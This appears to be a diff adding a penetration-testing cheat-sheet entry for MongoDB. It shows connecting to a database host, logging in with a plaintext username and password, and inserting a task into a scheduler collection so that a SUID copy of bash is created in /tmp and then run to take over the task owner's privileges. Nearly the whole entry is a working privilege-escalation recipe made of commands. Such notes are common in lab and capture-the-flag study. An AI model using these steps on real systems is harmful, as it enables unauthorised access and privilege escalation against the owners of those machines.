@@ -1,1 +1,10 @@
-
+- mongodb (27017):
+    > mongo --host 192.168.69.69
+    > mongo --host 192.168.69.69 --port 12345
+    > db
+    > use <db name>
+    > mongo -p password -u mark scheduler
+    - once in the scheduler add a line to create suid binary in /tmp
+        > db.tasks.insert( { "cmd": "/bin/cp /bin/bash /tmp/puckbash; chmod u+s /tmp/puckbash;" } );
+    - run binary to be said user
+        > /tmp/puckbash -p
